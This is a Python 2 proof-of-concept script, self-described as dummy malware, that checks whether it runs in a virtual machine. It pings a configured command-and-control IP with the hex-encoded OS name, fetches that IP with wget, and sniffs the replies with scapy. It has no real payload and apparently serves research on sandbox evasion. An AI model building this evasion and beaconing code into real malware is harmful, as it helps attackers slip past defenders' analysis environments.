#!/usr/bin/python
"""
malware.py: Dummy malware that uses Anti VM techniques that are based on
            virtual NAT behavior.
"""

from logging import getLogger, ERROR
getLogger("scapy.runtime").setLevel(ERROR)
from scapy.sendrecv import sniff
from scapy import route
from scapy.layers.inet import TCP, IP, ICMP, Raw
from json import load
from sys import platform
from subprocess import check_output, CalledProcessError
from threading import Thread


FIN_PSH_ACK = 0x19


def get_os():
    """
    Return system OS name.
    :return: string
    """
    if platform.startswith('linux'):
        return 'Linux'
    elif platform.startswith('win'):
        return 'Windows'


def parse_packet(pkt):
    """
    Get response form C2.
    :param pkt: ICMP reply.
    """
    payload = pkt[Raw].load
    if payload.endswith('True'):
        print 'VM Detected'
    elif payload.endswith('False'):
        print 'No VM start doing bad things...'
    else:
        print 'Still not clear if VM...'


def filter_icmp(pkt):
    """
    Filter for relevant ICMP reply packets.
    :param pkt: Packet to filter
    :return: bool
    """
    return (ICMP in pkt and pkt[ICMP].type == 0 and
            pkt[IP].src == c2_ip and Raw in pkt)


def http_filter(pkt):
    """
    Checks if this is relevant HTTP Request packet.

    :type p: Packet
    :param p: Packet to check.
    :return: Returns true if HTTP Request packet, else false.
    """
    return (TCP in pkt and Raw in pkt and str(pkt[Raw]).startswith('HTTP') and
            pkt[TCP].flags & FIN_PSH_ACK and pkt[IP].src == c2_ip)


def icmp_sniffing():
    """
    Start sniffing for ICMP reply packet
    """
    sniff(prn=parse_packet, lfilter=filter_icmp, count=1)


def http_response_sniffing():
    """
    Start sniffing for relevant HTTP Response packet
    """
    sniff(prn=parse_packet, lfilter=http_filter, count=1)


def ip_id_anti_vm(local_os):
    """
    Run IP ID based Anti VM technique.

    :param local_os: Local system OS name.
    """
    sniff_thread = Thread(target=icmp_sniffing)
    sniff_thread.daemon = True
    # Start sniffing for ICMP reply from C2
    sniff_thread.start()
    print 'Send IP ID checking...'
    # From Linux this will generate 2 packet with random IP ID
    # and from Windows 2 packets with sequential by one IP ID
    try:
        check_output(["ping", "-p", local_os, "-c", "2", c2_ip])
    except CalledProcessError:
        pass
    sniff_thread.join()


def ttl_anti_vm():
    """
    Run TTL based Anti VM technique.
    """
    sniff_thread = Thread(target=http_response_sniffing)
    sniff_thread.daemon = True
    # Start sniffing for HTTP Response
    sniff_thread.start()
    print 'Send TTL checking...'
    # From Linux and MAC this will generate TTL 64 in HTTP GET packet
    # and from Windows this will generate TTL 128
    try:
        check_output(["wget", c2_ip, "-q"])
    except CalledProcessError:
        pass
    sniff_thread.join()


if __name__ == '__main__':
    try:
        with open('malware_conf.json') as conf_file:
            conf = load(conf_file)
            c2_ip = conf['C2 IP']
            message = get_os()
            # Encode message to hex so we can send it with ping pattern option
            hex_message = message.encode('hex')
            ip_id_anti_vm(hex_message)
            ttl_anti_vm()
    except IOError:
        print "Can't open the configuration file."
    except CalledProcessError:
        print "Failed to execute "
